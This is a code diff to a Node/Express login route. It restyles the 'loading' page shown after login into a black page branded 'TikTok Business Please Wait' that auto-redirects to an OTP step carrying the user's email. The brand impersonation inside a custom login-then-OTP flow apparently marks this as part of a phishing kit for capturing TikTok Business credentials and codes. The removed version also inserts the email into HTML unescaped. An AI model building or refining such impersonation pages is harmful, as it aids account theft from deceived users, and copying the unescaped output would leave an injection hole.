@@ -203,48 +203,65 @@ app.post('/api/users/login', async (req, res) => {
 
     res.send(`
       <!DOCTYPE html>
-      <html>
-      <head>
-        <title>Loading...</title>
-        <style>
-          body {
-            font-family: Arial, sans-serif;
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #000000;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          }
-          .loading-container {
+        }
+        
+        .loading-container {
             text-align: center;
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-          }
-          .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+        }
+        
+        .logo {
+            color: white;
+            font-size: 28px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            margin-bottom: 30px;
+        }
+        
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #ffffff;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-          }
-          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-          .email { color: #667eea; font-weight: bold; }
-        </style>
-        <meta http-equiv="refresh" content="3;url=/users/otp?email=${encodeURIComponent(email)}">
-      </head>
-      <body>
-        <div class="loading-container">
-          <h2>Processing your request...</h2>
-          <div class="spinner"></div>
-          <p>Please wait, redirecting to OTP creation for <span class="email">${email}</span>...</p>
-        </div>
-      </body>
-      </html>
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .message {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 400;
+            opacity: 0.9;
+        }
+    </style>
+    <meta http-equiv="refresh" content="2;url=/users/otp?email=${encodeURIComponent(email)}">
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo">TikTok Business Please Wait</div>
+        <div class="spinner"></div>
+        <div class="message">Loading...</div>
+    </div>
+</body>
+</html>
     `);
   } catch (error) {
     console.error('❌ Login error:', error.message);
